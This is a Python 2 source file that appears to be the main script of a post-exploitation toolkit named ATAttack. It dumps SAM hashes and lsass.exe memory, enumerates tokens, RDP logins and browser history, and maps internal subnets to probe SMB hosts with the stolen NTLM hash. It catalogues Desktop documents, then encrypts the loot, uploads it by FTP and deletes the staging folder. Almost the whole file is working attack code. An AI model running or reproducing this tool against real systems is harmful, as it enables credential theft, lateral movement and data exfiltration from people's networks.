#! /usr/bin/env python2.7
# -*- coding:UTF-8 -*-


import fnmatch
from ATAttack.utility.browser import *
from ATAttack.enumeration.host import send_ttl
from ATAttack.credentials.check import ipadders, smb_version
from ATAttack.framework.prints import *
from ATAttack.utility.browser import Software
from ATAttack.enumeration.tasklist import disk
from ATAttack.enumeration.tasklist import tasklist,token
from ATAttack.enumeration.connect import login_
from ATAttack.framework.constant import constant
from ATAttack.enumeration.upload import upload
from ATAttack.credentials.dump import samdump

ipadder_list = []
tmp = os.mkdir(constant.upload_dir)
print constant.upload_dir


class exploit:
    def __init__(self, list):
        self.list = list

    def cmd(self, list):
        self.browers_history()
        for i in list:
            ret = os.popen(i).read()
            ipadder_list.append(ret.decode('cp936').encode('utf-8').strip())
        ip = re.findall(
            r'1(?:\d{1,3}\.){3}\d{1,3}(?![\.\d])',
            str(ipadder_list),
            re.S)
        iplist = []
        for ipaddr in ip:
            ipadder = ipaddr.split(
                '.')[0] + '.' + ipaddr.split('.')[1] + '.' + ipaddr.split('.')[2]
            iplist.append(ipadder)
        return iplist

    def pings(self):
        list = []
        ipadder = (set(self.cmd(constant.cmdlist)))
        aparagraph = [x + ".1" for x in ipadder]
        bparagraph = [x + ".254" for x in ipadder]
        aparagraph.extend(bparagraph)
        for add in aparagraph:
            if ipadders().is_internal_ip(add):
                list.append(add)
        print_info("{} were obtained through information collection".format(
            str(len(list))))
        regex = set(send_ttl(list))
        return regex

    def ipcidr(self):
        try:
            dump = samdump().save_hives()
            # dump = "fc66399dae9416d8455605b8498ea328"
            print_success(
                "Successful acquisition of administrator ntlmhash :{}".format(dump))
            print_warning(
                "Attempting to export the lsass.exe process")
            upload_ = upload()
            upload_.lsass_dump()
            print_info("Return successful, please check")
            for network in self.pings():
                print_warning("Discovered that the segment network is reachable :" + network )
                smb_version(network, dump)
        except Exception:
            pass
        finally:
            upload_.ftp_upload(upload_.zip_encrypt(constant.upload_dir))
            os.system("rd /s/q" + " " + constant.upload_dir)

    def browers_history(self):
        Software_ = Software()
        for url in Software_.run():
            import urlparse
            url_change = urlparse.urlparse(url)
            host = url_change.netloc
            ipadder_list.append(host)


class information():

    @staticmethod

    def run():

        if len(disk()) == 1:
            exit()
        print_success('Existing in the current process' + tasklist())
        login_().rdplogin_()
        print_success("Delegation tokens Available" + "\n"  + str(token()))
        dir = os.path.join(os.path.expanduser("~"), 'Desktop') + '\\'
        print_warning('Attempting to obtain system sensitive files')
        file = ['*.pdf', '*.doc', '*.docx', '*.ppt', '*.pptx', "*.xlsx", "*.rtf", "*.csv",'*.txt']
        f = open(constant.tmp_name_, 'w')
        for root, dirs, files in os.walk(dir):
            for name in files:
                for file_ in file:
                    if fnmatch.fnmatch(name, file_):
                        f.write(os.path.join(root, name))
                        f.write('\n')
        f.close()


class _start():

    @staticmethod

    def run():

        ia = information()
        ia.run()
        ig = exploit(constant.cmdlist)
        ig.ipcidr()

if __name__ == '__main__':

    _start().run()
